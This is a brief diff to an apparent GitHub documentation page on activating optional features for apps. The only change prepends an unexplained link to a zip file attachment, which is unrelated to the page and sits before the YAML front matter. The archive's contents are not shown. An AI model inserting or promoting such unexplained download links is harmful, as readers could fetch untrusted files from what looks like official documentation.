@@ -1,3 +1,4 @@
+[git-master (1).zip](https://github.com/github/docs/files/7903744/git-master.1.zip)
 ---
 title: Activating optional features for apps
 intro: 'You can test new optional features for your {% data variables.product.prodname_github_apps %} and {% data variables.product.prodname_oauth_apps %}.'
